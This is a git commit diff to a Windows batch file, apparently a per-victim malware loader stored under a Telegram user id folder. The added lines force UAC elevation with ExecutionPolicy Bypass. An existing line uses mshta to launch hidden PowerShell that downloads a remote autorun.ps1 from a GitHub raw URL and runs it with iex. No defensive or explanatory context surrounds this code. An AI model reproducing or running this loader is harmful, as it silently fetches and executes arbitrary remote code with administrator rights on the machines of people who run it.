e60e00e5b39b3eb121e40cc37e5005d41a0235ce
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:40:17 +0700

    Update main.bat

--- usertelegram/1086990476411932722/main.bat
+++ usertelegram/1086990476411932722/main.bat
@@ -1,2 +1,7 @@
 @echo off
+
+net session >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+cd /d %~dp0
+
 mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$userid = 1086990476411932722;$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/Extras/autorun.ps1' -USeB | iex",0))
